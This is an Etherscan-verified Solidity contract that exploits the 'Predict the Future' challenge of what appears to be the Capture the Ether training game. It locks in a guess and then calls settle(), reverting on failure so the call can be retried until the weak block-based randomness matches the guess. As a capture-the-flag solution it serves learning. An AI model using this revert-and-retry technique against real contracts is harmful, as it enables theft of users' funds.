/**
 *Submitted for verification at Etherscan.io on 2021-11-10
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface PredictTheFutureChallenge {
    function isComplete() external view returns (bool);

    function lockInGuess(uint8 n) external payable;

    function settle() external;
}

contract ExploitPredictTheFutureChallenge {
    address owner;
    PredictTheFutureChallenge PTFC;
    
    constructor (address _address) {
        owner = msg.sender;
        PTFC = PredictTheFutureChallenge(_address);
    }
    
    function lockInGuess() external payable {
        PTFC.lockInGuess{value: 1 ether}(uint8(0));
    }

    function attack() external payable {
        PTFC.settle();
        
        require(PTFC.isComplete(), "Not Completed");
        
        (bool sent, ) = owner.call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }
}